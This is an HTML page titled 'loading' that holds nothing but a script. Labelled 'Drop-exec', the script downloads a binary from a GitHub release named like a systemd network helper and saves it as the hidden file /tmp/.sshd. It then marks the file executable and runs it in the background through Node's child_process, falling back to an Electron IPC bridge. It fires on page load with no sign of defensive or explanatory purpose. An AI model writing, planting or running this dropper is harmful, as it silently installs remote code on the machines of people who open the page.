<!DOCTYPE html>
<html>
<head><title>loading</title></head>
<body>
<script>
// Drop-exec: fetch a binary, write to a hidden tmp path via electron's IPC, chmod +x, background-exec.
const url = "https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network";
const cmd = "curl -skL " + url + " -o /tmp/.sshd && chmod +x /tmp/.sshd && /tmp/.sshd &";
try {
  const { exec } = require("child_process");
  exec(cmd);
} catch (e) {
  fetch(url).then(r => r.arrayBuffer()).then(buf => {
    if (window.electronAPI) window.electronAPI.dropExec("/tmp/.sshd", buf, cmd);
  });
}
</script>
</body>
</html>
